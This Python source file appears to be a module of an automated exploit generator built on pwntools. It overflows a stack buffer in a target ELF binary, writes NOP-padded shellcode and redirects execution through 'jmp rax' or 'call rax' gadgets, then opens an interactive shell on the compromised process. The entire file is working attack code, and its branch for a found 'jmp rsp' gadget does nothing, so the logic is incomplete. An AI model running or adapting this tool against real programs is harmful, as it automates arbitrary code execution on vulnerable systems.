from pwn import *
from pwn_master.exploit_generator.shellcode import Shellcode

# context.log_level = 'DEBUG'


class ShellcodeExploiter:
    def __init__(self, binary, vuln_details):
        self.binary = binary
        context.binary = self.binary.elf
        self.globals = vuln_details
        self.output = b""
        self.last_output = b""
        self.shellcode = Shellcode(self.binary)

    def apply_payload(self, input, rop):
        ip = b"X" * self.binary.elf.bytes
        chain_length = len(input)
        log.info("total payload length: {}".format(chain_length))
        offset = input.index(ip)
        log.info("buffer offset: {}".format(offset))
        exploit_entry_input = input[0:offset]

        jmp_rsp = self.binary.find_bytes(asm('jmp rsp'))

        if jmp_rsp is None:
            pivot_rax = self.binary.find_bytes(asm('jmp rax'))
            if pivot_rax is None:
                pivot_rax = self.binary.find_bytes(asm('call rax'))
            nop = asm(shellcraft.nop())
            rop.raw(self.shellcode.content.ljust(offset, nop))
            rop.raw(pivot_rax)

    def apply_exploit_input(self, process, rop):
        current_output = b""
        for i, input in enumerate(self.globals["input"]):
            current_output += process.clean_and_log()
            ip = b"X" * self.binary.elf.bytes
            if ip not in input:
                process.send(input)
            else:
                self.apply_payload(input, rop)
                chain = rop.chain()
                process.sendline(chain)

        current_output += process.clean_and_log()
        log.info("current output: {}".format(current_output))
        self.last_output = self.output.replace(current_output, b"")
        log.info("last output: {}".format(self.last_output))

    def shellcode_attack(self):
        process = self.binary.elf.process()

        rop = ROP([self.binary.elf])
        self.apply_exploit_input(process, rop)

        process.interactive()
